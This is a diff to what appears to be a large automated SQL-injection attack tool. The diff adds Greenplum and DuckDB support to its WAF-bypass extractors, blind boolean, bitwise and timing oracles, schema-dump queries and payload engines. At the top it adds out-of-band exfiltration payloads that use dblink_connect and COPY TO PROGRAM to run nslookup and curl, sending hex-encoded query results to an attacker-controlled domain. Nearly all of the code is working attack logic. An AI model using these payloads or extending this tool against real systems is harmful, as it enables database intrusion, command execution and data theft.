+        # supports dblink, COPY TO PROGRAM, and XML parsing identically to PostgreSQL.
+        "Greenplum": [
+            ("dblink_connect",
+             "SELECT dblink_connect('exfil_' || encode(({query})::bytea,'hex'),  'host=' || encode(({query})::bytea,'hex') || '.{domain} dbname=x user=x connect_timeout=3')"),
+            ("copy_curl_dns",
+             "COPY (SELECT ({query})) TO PROGRAM 'bash -c \"nslookup $(cat /dev/stdin | xxd -p | tr -d ''\\n'') .{domain} > /dev/null 2>&1\"'"),
+            ("copy_curl_http",
+             "COPY (SELECT ({query})) TO PROGRAM 'curl -sk \"http://{domain}/?d=$(cat /dev/stdin | xxd -p | tr -d ''\\n'')\" > /dev/null 2>&1'"),
         ],
         "MySQL": [
             ("load_file_dns",
@@ -165991,6 +166771,10 @@ class ConnectionExhaustionOracle:
         "CockroachDB": "SELECT pg_advisory_lock({lock_id})",
         "YugabyteDB": "SELECT pg_advisory_lock({lock_id})",       # BUG-LOCK-YUGABYTE FIX
         "Amazon Redshift": "SELECT pg_advisory_lock({lock_id})",  # BUG-LOCK-REDSHIFT FIX
+        # BUG-LOCK-GREENPLUM FIX: Greenplum is PG-based and supports pg_advisory_lock.
+        # Without explicit entry, build_conditional_lock falls back to PostgreSQL via .get()
+        # default — functionally correct, but explicit entry is cleaner and more maintainable.
+        "Greenplum": "SELECT pg_advisory_lock({lock_id})",
         "MySQL": "SELECT GET_LOCK('sqli_{lock_id}', 999)",
         "MariaDB": "SELECT GET_LOCK('sqli_{lock_id}', 999)",
         "TiDB": "SELECT GET_LOCK('sqli_{lock_id}', 999)",         # BUG-LOCK-TIDB FIX
@@ -166152,12 +166936,19 @@ class NovelWAFBypassExtractor:
             "ClickHouse":      "isNull(NULL)",
             "Informix":        "(1e0 IS NOT NULL)",
             "SAP_HANA":        "(1e0 IS NOT NULL)",
+            # BUG-NOVEL-GREENPLUM-DUCKDB-TRUE-COND FIX: Greenplum and DuckDB absent → fell
+            # to default "NOT (1e0 IS NULL)" which works but is less distinctive. Use the
+            # same PG-compatible ARRAY_LOWER expression for novel WAF bypass oracle.
+            "Greenplum":       "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "DuckDB":          "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
         }.get(dbms, "NOT (1e0 IS NULL)")
         _novel_false_cond = {
             "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
             "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
             "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
             "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "Greenplum":       "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "DuckDB":          "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
             "MySQL":           "ISNULL(1e0)",
             "MariaDB":         "ISNULL(1e0)",
             "TiDB":            "ISNULL(1e0)",
@@ -166841,7 +167632,7 @@ class NovelWAFBypassExtractor:
                     # are indistinguishable (e.g. CDN ignores cache headers for this target).
                     _do_extract = True
                     try:
-                        if dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                        if dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
                             _vtp = "CASE WHEN (ASCII(SUBSTR(version(),1,1))>=32) THEN md5(random()::text) ELSE version() END"
                             _vfpl = "CASE WHEN (ASCII(SUBSTR(version(),1,1))>=250) THEN md5(random()::text) ELSE version() END"
                         elif dbms in ("MySQL", "MariaDB", "TiDB"):
@@ -166942,7 +167733,7 @@ class NovelWAFBypassExtractor:
                             # Numeric safety: neither function rewrites the integer _mid literal or
                             # the >= comparison operator; they case-mix function names and rotate
                             # comment suffixes only — SQL expression semantics are preserved.
-                            if dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                            if dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
                                 _char_func = f"ASCII(SUBSTR(version(),{_pos},1))"
                                 _test_payload = (f"CASE WHEN ({_char_func}>={_mid}) "
                                                  f"THEN md5(random()::text) ELSE version() END")
@@ -167160,7 +167951,7 @@ class NovelWAFBypassExtractor:
                 func = q.replace("SELECT ", "").strip()
                 chr_func = PreparedStatementBypass.build_chr_string(func, dbms)
                 # Use EXECUTE with CHR-built string
-                if dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                if dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
                     chr_sql = f"EXECUTE 'SELECT ' || {chr_func}"
                 elif dbms in ("MySQL", "MariaDB", "TiDB"):
                     # BUG-NOVEL-CHR-TIDB FIX: TiDB supports MySQL PREPARE/EXECUTE syntax.
@@ -167198,6 +167989,8 @@ class CachePoisonOracle:
         "CockroachDB":    "CASE WHEN ({cond}) THEN current_setting('server_version') ELSE md5(random()::text) END",
         "YugabyteDB":     "CASE WHEN ({cond}) THEN current_setting('server_version') ELSE md5(random()::text) END",
         "Amazon Redshift": "CASE WHEN ({cond}) THEN current_setting('server_version') ELSE md5(random()::varchar) END",
+        "Greenplum": "CASE WHEN ({cond}) THEN current_setting('server_version') ELSE md5(random()::varchar) END",
+        "DuckDB": "CASE WHEN ({cond}) THEN current_setting('server_version') ELSE md5(random()::varchar) END",
     }
 
     @classmethod
@@ -167343,6 +168136,8 @@ class ConditionalRedirectOracle:
         "CockroachDB":    "CASE WHEN ({cond}) THEN '/true_' || md5('sr') ELSE '/false_' || md5('sr') END",
         "YugabyteDB":     "CASE WHEN ({cond}) THEN '/true_' || md5('sr') ELSE '/false_' || md5('sr') END",
         "Amazon Redshift": "CASE WHEN ({cond}) THEN '/true_' || md5('sr') ELSE '/false_' || md5('sr') END",
+        "Greenplum": "CASE WHEN ({cond}) THEN '/true_' || md5('sr') ELSE '/false_' || md5('sr') END",
+        "DuckDB": "CASE WHEN ({cond}) THEN '/true_' || md5('sr') ELSE '/false_' || md5('sr') END",
     }
 
     @classmethod
@@ -167375,6 +168170,8 @@ class TCPSideChannel:
         "CockroachDB":    "CASE WHEN ({cond}) THEN REPEAT('A',{size}) ELSE '1' END",
         "YugabyteDB":     "CASE WHEN ({cond}) THEN REPEAT('A',{size}) ELSE '1' END",
         "Amazon Redshift": "CASE WHEN ({cond}) THEN REPEAT('A',{size}) ELSE '1' END",
+        "Greenplum": "CASE WHEN ({cond}) THEN REPEAT('A',{size}) ELSE '1' END",
+        "DuckDB": "CASE WHEN ({cond}) THEN REPEAT('A',{size}) ELSE '1' END",
     }
 
     @classmethod
@@ -167515,6 +168312,14 @@ class ConditionalErrorTypeOracle:
             "raise":     "DO $$ BEGIN RAISE EXCEPTION 'x'; END $$",
         },
         "Amazon Redshift": {
+            "div_zero":  "1/0",
+            "cast_fail": "CAST('x' AS INTEGER)",
+        },
+        "Greenplum": {
+            "div_zero":  "1/0",
+            "cast_fail": "CAST('x' AS INTEGER)",
+        },
+        "DuckDB": {
             "div_zero":  "1/0",
             "cast_fail": "CAST('x' AS INTEGER)",
         },
@@ -167715,6 +168520,8 @@ async def _bitwise_extract_with_oracle(eval_fn, query: str, dbms: str,
         # are PostgreSQL-wire-compatible; ASCII(SUBSTRING()) is correct for both.
         "YugabyteDB": "ASCII(SUBSTRING(({q}),{p},1))",
         "Amazon Redshift": "ASCII(SUBSTRING(({q}),{p},1))",
+        "Greenplum": "ASCII(SUBSTRING(({q}),{p},1))",
+        "DuckDB": "ASCII(SUBSTRING(({q}),{p},1))",
         "MySQL": "ORD(MID(({q}),{p},1))",
         "MariaDB": "ORD(MID(({q}),{p},1))",
         # BUG-BITWISE-TIDB-ASCII-FUNC FIX (MEDIUM, TiDB, _bitwise_extract_with_oracle,
@@ -167838,6 +168645,8 @@ async def _bitwise_extract_with_oracle(eval_fn, query: str, dbms: str,
                 "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                 "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                 "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                "Greenplum": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                "DuckDB": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                 "MySQL":           "ISNULL(NULL)",
                 "MariaDB":         "ISNULL(NULL)",
                 "TiDB":            "ISNULL(NULL)",
@@ -167951,6 +168760,8 @@ async def _bitwise_extract_with_oracle(eval_fn, query: str, dbms: str,
                 "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                 "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                 "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                "Greenplum": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                "DuckDB": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                 "MySQL":           "ISNULL(NULL)",
                 "MariaDB":         "ISNULL(NULL)",
                 "TiDB":            "ISNULL(NULL)",
@@ -168033,7 +168844,7 @@ async def _bitwise_extract_with_oracle(eval_fn, query: str, dbms: str,
                          else 21 if dbms in ("SQLite", "MySQL", "MariaDB",
                                               "TiDB", "PostgreSQL",
                                               "CockroachDB", "YugabyteDB",
-                                              "Amazon Redshift")
+                                              "Amazon Redshift", "Greenplum", "DuckDB")
                          else 8)  # BUG-NOVEL-PG-ORACLE-BITS FIX: added Oracle→16, PG→21; BUG-NOVEL-TIDB-YUGABYTEDB-BITS FIX: added TiDB/YugabyteDB→21
         # BUG-BITWISE-REDSHIFT-8BITS FIX (MEDIUM, Amazon Redshift, _bitwise_extract_with_oracle,
         # novel-oracle bitwise technique, all surfaces, all HTTP methods):
@@ -168121,7 +168932,7 @@ async def _bitwise_extract_with_oracle(eval_fn, query: str, dbms: str,
                           else 1114111 if dbms in ("SQLite", "MySQL", "MariaDB",
                                                     "TiDB", "PostgreSQL",
                                                     "CockroachDB", "YugabyteDB",
-                                                    "Amazon Redshift")
+                                                    "Amazon Redshift", "Greenplum", "DuckDB")
                           else 255)  # BUG-NOVEL-PG-ORACLE-BITS FIX: Oracle→65535, PG→1114111; BUG-NOVEL-TIDB-YUGABYTEDB-BITS: added TiDB/YG→1114111; BUG-NOVEL-CHAR-HI-REDSHIFT FIX: added Amazon Redshift→1114111
         if 32 <= char_val <= _novel_char_hi:
             result += chr(char_val)
@@ -168788,7 +169599,7 @@ class ParallelChunkedExtractor:
             return (f"SELECT GROUP_CONCAT({col_concat} ORDER BY 1 SEPARATOR {self.ROW_SEP!r}) "
                     f"FROM (SELECT {','.join(cols)} FROM `{db}`.`{table}` "
                     f"LIMIT {limit} OFFSET {offset}) _t")
-        elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
             # BUG-CHUNK-YUGABYTE FIX: include YugabyteDB in the PG string_agg branch.
             return (f"SELECT string_agg({col_concat},{self.ROW_SEP!r}) "
                     f"FROM (SELECT {','.join(cols)} FROM \"{db}\".\"{table}\" "
@@ -170151,7 +170962,7 @@ $q = "SELECT * FROM users WHERE id = " . $_GET['id'];
 $stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
 $stmt->execute([$_GET['id']]);
 $rows = $stmt->fetchAll();</pre>"""
-        elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
             rem_html = """<pre class="lang-python"># VULNERABLE:
 cur.execute(f"SELECT * FROM users WHERE id = {request.args['id']}")
 
@@ -172026,7 +172837,7 @@ class AdaptiveFrequencyExtractorV18(AdaptiveFrequencyExtractor):
             hi = 65535
         elif dbms in ("MySQL", "MariaDB", "TiDB", "PostgreSQL", "CockroachDB",
                       "YugabyteDB", "SQLite",
-                      "Amazon Redshift"):  # BUG-V140-AFEV18-REDSHIFT-FREQ-BSEARCH FIX
+                      "Amazon Redshift", "Greenplum", "DuckDB"):  # BUG-V140-AFEV18-REDSHIFT-FREQ-BSEARCH FIX
             # BUG-V140-AFEV18-REDSHIFT-FREQ-BSEARCH FIX (HIGH, Amazon Redshift;
             # AdaptiveFrequencyExtractorV18._freq_binary_search; B/BH/IN techniques;
             # all surfaces; all HTTP methods):
@@ -172137,7 +172948,7 @@ class AdaptiveFrequencyExtractorV18(AdaptiveFrequencyExtractor):
                         else 1114111 if dbms in ("MySQL", "MariaDB", "TiDB",
                                                   "PostgreSQL", "CockroachDB",
                                                   "YugabyteDB", "SQLite",
-                                                  "Amazon Redshift")  # BUG-V140-AFEV18-REDSHIFT-FREQ-BSEARCH FIX
+                                                  "Amazon Redshift", "Greenplum", "DuckDB")  # BUG-V140-AFEV18-REDSHIFT-FREQ-BSEARCH FIX
                         else 255)
         if 32 <= lo <= _fbs_char_hi:
             return chr(lo)
@@ -172377,7 +173188,8 @@ class ZKBooleanExtractorV18(ZKBooleanExtractor):
         def make_probe(bit: int) -> str:
             pow2 = 2 ** bit
             if dbms in ("MySQL", "MariaDB", "TiDB", "SQLite", "PostgreSQL",
-                        "CockroachDB", "DuckDB"):
+                        "CockroachDB", "YugabyteDB", "Amazon Redshift",
+                        "Greenplum", "DuckDB"):
                 cond = f"(({char_fn})>>{bit})&1=1"
             elif dbms == "MSSQL":
                 cond = f"(CAST(({char_fn}) AS INT)/{pow2})%2=1"
@@ -172589,6 +173401,7 @@ class ZKBooleanExtractorV18(ZKBooleanExtractor):
             "MySQL", "MariaDB", "TiDB",             # BUG-V140-ZKEV18-UNICODE-BYPASS FIX: 21-bit ORD()
             "PostgreSQL", "CockroachDB",             # BUG-V140-ZKEV18-UNICODE-BYPASS FIX: 21-bit ASCII()
             "YugabyteDB", "Amazon Redshift",         # BUG-V140-ZKEV18-UNICODE-BYPASS FIX: 21-bit ASCII()
+            "Greenplum", "DuckDB",                   # PG-family: full Unicode ASCII()
         )
         if dbms in _zkev18_fallback_dbms and byte_val >= 128:
             # Delegate to parent's binary-search ask() path for full Unicode accuracy.
@@ -172662,7 +173475,9 @@ class MetamorphicPayloadEngineV18:
                       # pg_sleep() for timing; TiDB uses MySQL-compat SLEEP() (no remap).
                       "CockroachDB":    "pg_sleep({})",
                       "YugabyteDB":     "pg_sleep({})",
-                      "Amazon Redshift": "pg_sleep({})"},
+                      "Amazon Redshift": "pg_sleep({})",
+                      "Greenplum": "pg_sleep({})",
+                      "DuckDB": "pg_sleep({})"},
         "SUBSTRING": {"MSSQL": "SUBSTRING",
                       "Oracle": "SUBSTR",
                       "DB2": "SUBSTR"},
@@ -172672,7 +173487,9 @@ class MetamorphicPayloadEngineV18:
                       "TiDB": "IFNULL({},NULL)",
                       "CockroachDB": "COALESCE({},NULL)",
                       "YugabyteDB": "COALESCE({},NULL)",
-                      "Amazon Redshift": "COALESCE({},NULL)"},
+                      "Amazon Redshift": "COALESCE({},NULL)",
+                      "Greenplum": "COALESCE({},NULL)",
+                      "DuckDB": "COALESCE({},NULL)"},
         "VERSION":   {"MSSQL": "@@VERSION",
                       "Oracle": "(SELECT banner FROM v$version WHERE ROWNUM=1)",
                       "DB2": "CURRENT_VERSION",
@@ -172685,7 +173502,9 @@ class MetamorphicPayloadEngineV18:
                       # TiDB is MySQL-wire; DATABASE() is already the MySQL default.
                       "CockroachDB":    "current_database()",
                       "YugabyteDB":     "current_database()",
-                      "Amazon Redshift": "current_database()"},
+                      "Amazon Redshift": "current_database()",
+                      "Greenplum": "current_database()",
+                      "DuckDB": "current_database()"},
         # BUG-V33-5b FIX: Wrap Oracle SYS_CONTEXT in SELECT ... FROM DUAL scalar subquery.
         "USER":      {"MSSQL": "SYSTEM_USER",
                       "PostgreSQL": "current_user",
@@ -172695,7 +173514,9 @@ class MetamorphicPayloadEngineV18:
                       "TiDB":           "CURRENT_USER()",
                       "CockroachDB":    "current_user",
                       "YugabyteDB":     "current_user",
-                      "Amazon Redshift": "current_user"},
+                      "Amazon Redshift": "current_user",
+                      "Greenplum": "current_user",
+                      "DuckDB": "current_user"},
     }
 
     def __init__(self):
@@ -173309,7 +174130,7 @@ class NovelWAFBypassV18(NovelWAFBypass):
 
         # Technique 27: generate_series timing (PostgreSQL-family — no-op otherwise)
         # BUG-GENSERIES-CRDB FIX: CockroachDB/YugabyteDB/Redshift support generate_series.
-        if dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        if dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
             try: payload = cls.generate_series_timing(payload)
             except Exception: pass
 
@@ -173333,7 +174154,7 @@ class NovelWAFBypassV18(NovelWAFBypass):
             payload = re.sub(r"AND\s+\(([^)]+)\)", r"AND JSON_VALID(IF(\1,'{\"a\":1}',''))", payload, count=1, flags=re.I)
         elif dbms == "MSSQL":
             payload = re.sub(r"AND\s+\(([^)]+)\)", r"AND JSON_VALUE(IIF(\1,'{\"r\":1}','{\"r\":0}'),'$.r')='1'", payload, count=1, flags=re.I)
-        elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
             # BUG-EXOTIC-BYPASS-CRDB FIX: CockroachDB/YugabyteDB/Redshift support json_build_object like PostgreSQL.
             payload = re.sub(r"AND\s+\(([^)]+)\)", r"AND (json_build_object('c',CASE WHEN \1 THEN 1 ELSE 0 END)->>'c')='1'", payload, count=1, flags=re.I)
         return payload
@@ -173379,7 +174200,7 @@ class NovelWAFBypassV18(NovelWAFBypass):
             payload = re.sub(r"\bAND\s+1=2\b", "AND BIT_COUNT(0)=1", payload, flags=re.I)
         elif dbms == "MSSQL":
             payload = re.sub(r"\bAND\s+1=1\b", "AND (1&1)=1", payload, flags=re.I)
-        elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
             # BUG-EXOTIC-BYPASS-BITWISE-CRDB FIX: wire-compatible PG DBMSes support (1&1)::boolean.
             payload = re.sub(r"\bAND\s+1=1\b", "AND (1&1)::boolean", payload, flags=re.I)
         return payload
@@ -173435,7 +174256,7 @@ class NovelWAFBypassV18(NovelWAFBypass):
             techniques = [cls.json_wrap_bypass, cls.spatial_bool_bypass,
                           cls.bitwise_bool_bypass, cls.user_var_bypass,
                           cls.mysql_procedure_analyse]
-        elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
             # BUG-EXOTIC-APPLYBYPASS-CRDB FIX: PG-wire-compatible DBMSes share PG techniques.
             techniques = [cls.json_wrap_bypass, cls.bitwise_bool_bypass,
                           cls.generate_series_timing, cls.xml_wrap_bypass]
@@ -173842,7 +174663,7 @@ class TechniqueCascadeEngineV18(TechniqueCascadeEngine):
 
         # Boost Boolean for time-based targets (to confirm first)
         if dbms_hint in ("MySQL", "MariaDB", "PostgreSQL", "TiDB",
-                          "CockroachDB", "YugabyteDB", "Amazon Redshift"):  # BUG-TECHRANK-NEWDBMS FIX: wire-compat DBMSes also benefit from Boolean/Error-based technique boost
+                          "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):  # BUG-TECHRANK-NEWDBMS FIX: wire-compat DBMSes also benefit from Boolean/Error-based technique boost
             scores["B"] = scores.get("B", 0.5) * 1.15
             scores["E"] = scores.get("E", 0.5) * 1.10
 
@@ -175708,6 +176529,8 @@ class SchemaEnumeratorV18:
             # GROUP_CONCAT (MySQL-only), invalid on Redshift. Redshift is PG-wire-
             # compatible; string_agg() with ORDER BY and LIMIT/OFFSET work correctly.
             "Amazon Redshift": "PostgreSQL",
+            "Greenplum": "PostgreSQL",
+            "DuckDB": "PostgreSQL",
             "DuckDB": "PostgreSQL",
             "Sybase": "MSSQL",  # BUG-SE-SYBASE-MYSQL-FALLBACK FIX
         }
@@ -175723,6 +176546,8 @@ class SchemaEnumeratorV18:
             parent_map = {"MariaDB":"MySQL", "TiDB":"MySQL",
                            "CockroachDB":"PostgreSQL", "YugabyteDB":"PostgreSQL",
                            "Amazon Redshift":"PostgreSQL",  # BUG-SE-REDSHIFT-MYSQL-FALLBACK FIX
+                           "Greenplum": "PostgreSQL",  # BUG-SE-REDSHIFT-MYSQL-FALLBACK FIX
+                           "DuckDB": "PostgreSQL",  # BUG-SE-REDSHIFT-MYSQL-FALLBACK FIX
                            "DuckDB":"PostgreSQL"}
             parent = parent_map.get(self.dbms)
             if parent:
@@ -176023,7 +176848,7 @@ class SchemaEnumeratorV18:
         # iterate with the wrong page count, silently producing incomplete dumps.
         # Fix: detect -1 for PostgreSQL/CockroachDB and fall back to an exact COUNT(*)
         # (full table scan, always accurate regardless of statistics state).
-        elif _parsed == -1 and self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        elif _parsed == -1 and self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
             LOG.info("[SchemaEnumeratorV18] PG/CockroachDB reltuples=-1 for %s.%s "
                      "(no statistics gathered) — falling back to exact COUNT(*)", db, table)
             if _edb:
@@ -176220,7 +177045,7 @@ class SchemaEnumeratorV18:
         # and CAST(... AS TEXT). Without this they fell to the generic else branch
         # which uses unquoted identifiers (breaking mixed-case column names) and
         # CAST(... AS VARCHAR(4096)) instead of TEXT.
-        elif self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        elif self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
             sep_char  = self.COL_SEP
             # BUG-PG-DUMP-FSTRING FIX: Two bugs in the original:
             # (1) The generator used a plain string, not an f-string, so {c} and
@@ -176386,7 +177211,7 @@ class SchemaEnumeratorV18:
         _use_nodb_variant = not db and self.dbms in (
             "Oracle", "MSSQL", "DB2", "SAP_HANA", "ClickHouse",
             "MySQL", "MariaDB", "TiDB", "PostgreSQL", "CockroachDB", "Sybase",
-            "YugabyteDB", "Amazon Redshift"
+            "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"
         )
         # BUG-SYBASE-OFFSET-PLUS-ONE FIX: Sybase TOP N START AT M pagination is
         # 1-indexed (START AT 1 = first row).  The Sybase row_chunked templates use
@@ -177589,7 +178414,7 @@ for _bp_entry in BOOLEAN_PAYLOADS_V18:
         if CERTIFIED_PAYLOAD_DATABASE:
             _v18_payload_str = str(_bp_entry[0])
             for _v18_dbms in ("MySQL", "PostgreSQL", "MSSQL", "Oracle", "SQLite", "MariaDB",
-                              "TiDB", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                              "TiDB", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
                 # BUG-CPDB-TIDB-CRDB FIX: Also inject v18 payloads for TiDB/CRDB/YugabyteDB/Redshift.
                 try:
                     _v18_cpdb_bool = (CERTIFIED_PAYLOAD_DATABASE
@@ -178140,7 +178965,7 @@ def _apply_improvements_v18():
         for _v18_pair in BOOLEAN_PAYLOADS_V18:
             _v18_p_str = str(_v18_pair[0])
             for _v18_cpdb_dbms in ("MySQL", "PostgreSQL", "MSSQL", "Oracle", "SQLite", "MariaDB",
-                                    "TiDB", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                                    "TiDB", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
                 # BUG-CPDB2-TIDB-CRDB FIX: also inject v18 boolean payloads for wire-compat DBMSes.
                 try:
                     _v18_bool_list = (CERTIFIED_PAYLOAD_DATABASE
@@ -178159,7 +178984,8 @@ def _apply_improvements_v18():
     # 6. Verify DBMS_QUERIES has all expected keys (sanity check)
     try:
         _missing_dbs = [db for db in ("MySQL", "MSSQL", "PostgreSQL", "Oracle", "SQLite",
-                                       "TiDB", "CockroachDB", "YugabyteDB", "Amazon Redshift", "MariaDB")  # BUG-DBMS-SANITY-REDSHIFT FIX
+                                       "TiDB", "CockroachDB", "YugabyteDB", "Amazon Redshift", "MariaDB",
+                                       "Greenplum", "DuckDB")  # BUG-DBMS-SANITY-REDSHIFT FIX
                         if db not in DBMS_QUERIES]
         if _missing_dbs:
             LOG.warning(f"_apply_improvements_v18: DBMS_QUERIES missing entries: {_missing_dbs}")
@@ -178595,6 +179421,8 @@ class WassersteinResponseOracle:
         "CockroachDB": 0.013,
         "YugabyteDB": 0.013,
         "Amazon Redshift": 0.013,
+        "Greenplum": 0.013,
+        "DuckDB": 0.013,
         "MSSQL": 0.018,   # MSSQL error responses contain verbose HTML diagnostics
         "Oracle": 0.016,  # Oracle ORA-XXXXX pages include stack traces
         "SQLite": 0.010,  # SQLite typically returns compact responses
@@ -180093,7 +180921,8 @@ class AdaptiveBinarySearchExtractor:
             # BUG-ABSE-TIDB-HI FIX: TiDB is MySQL-wire-compatible; ORD() returns 1,114,111 max.
             _effective_hi = 1114111
         elif _uses_ascii_fn and _dbms_hint in ("PostgreSQL", "CockroachDB",
-                                                "YugabyteDB", "Amazon Redshift", "DuckDB"):
+                                                "YugabyteDB", "Amazon Redshift", "DuckDB",
+                                                "Greenplum"):
             # PostgreSQL ASCII() returns full Unicode code point (NOT limited to 255)
             _effective_hi = 1114111
         elif _uses_ascii_fn and _dbms_hint == "Oracle":
@@ -181790,6 +182619,12 @@ class ConditionalErrorOracle:
             # It fell to MySQL templates (RAND/GROUP BY) which are invalid on Redshift.
             # Redshift is PG-wire-compatible; CAST(… AS INTEGER) triggers an error on Redshift.
             "Amazon Redshift": "PostgreSQL",
+            # BUG-CEO-GREENPLUM-ALIAS FIX: Greenplum was absent → fell to MySQL templates.
+            # Greenplum is PG-compatible; CAST(… AS INTEGER) error triggers work correctly.
+            "Greenplum":      "PostgreSQL",
+            # BUG-CEO-DUCKDB-ALIAS FIX: DuckDB was absent → fell to MySQL templates.
+            # DuckDB supports CAST(… AS INTEGER) error triggers; PG templates are correct.
+            "DuckDB":         "PostgreSQL",
             "TiDB":        "MySQL",       # MySQL-compatible: IF/RAND/GROUP BY works
             "Sybase":      "MSSQL",       # T-SQL-compatible: CASE WHEN … THEN 1/0 works
             "MariaDB":     "MySQL",       # MySQL-compatible
@@ -181816,6 +182651,12 @@ class ConditionalErrorOracle:
             "CockroachDB":    "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
             "YugabyteDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
             "Amazon Redshift":"ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            # BUG-CEO-CAL-GREENPLUM-DUCKDB FIX: Greenplum and DuckDB were absent from
+            # _ceo_cal_true/_ceo_cal_false. Both fell to the generic fallback ("NOT (1e0 IS NULL)")
+            # which uses literal-float comparison that may behave differently depending on the
+            # SQL context. Greenplum is PG-compatible: ARRAY_LOWER works. DuckDB supports it too.
+            "Greenplum":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "DuckDB":         "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
             "MySQL":          "ISNULL(NULL)",
             "MariaDB":        "ISNULL(NULL)",
             "TiDB":           "ISNULL(NULL)",
@@ -181835,6 +182676,8 @@ class ConditionalErrorOracle:
             "CockroachDB":    "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
             "YugabyteDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
             "Amazon Redshift":"ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "Greenplum":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "DuckDB":         "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
             "MySQL":          "ISNULL(1e0)",
             "MariaDB":        "ISNULL(1e0)",
             "TiDB":           "ISNULL(1e0)",
@@ -182263,6 +183106,8 @@ class BatchedCharExtractor:
         # regression and makes the intent unambiguous for CHAR_RANGE/NULL_WRAPPER
         # entries added alongside this fix. Numeric safety: function-name strings only.
         "Amazon Redshift": ("ASCII", "SUBSTRING"),  # PG-compat: ASCII() returns 0..U+10FFFF
+        "Greenplum": ("ASCII", "SUBSTRING"),  # PG-compat: ASCII() returns 0..U+10FFFF
+        "DuckDB": ("ASCII", "SUBSTRING"),  # PG-compat: ASCII() returns 0..U+10FFFF
     }
 
     # BUG-NULL-WRAPPER FIX (Req 7/10): UNICODE(SUBSTR()) returns NULL when pos > len
@@ -182318,6 +183163,8 @@ class BatchedCharExtractor:
         # Numeric safety: COALESCE only changes NULL handling; no comparison operands
         # or string delimiters are modified.
         "Amazon Redshift": ("COALESCE(", ",0)"),  # PG-compat: ASCII(empty) = NULL → COALESCE → 0
+        "Greenplum": ("COALESCE(", ",0)"),  # PG-compat: ASCII(empty) = NULL → COALESCE → 0
+        "DuckDB": ("COALESCE(", ",0)"),  # PG-compat: ASCII(empty) = NULL → COALESCE → 0
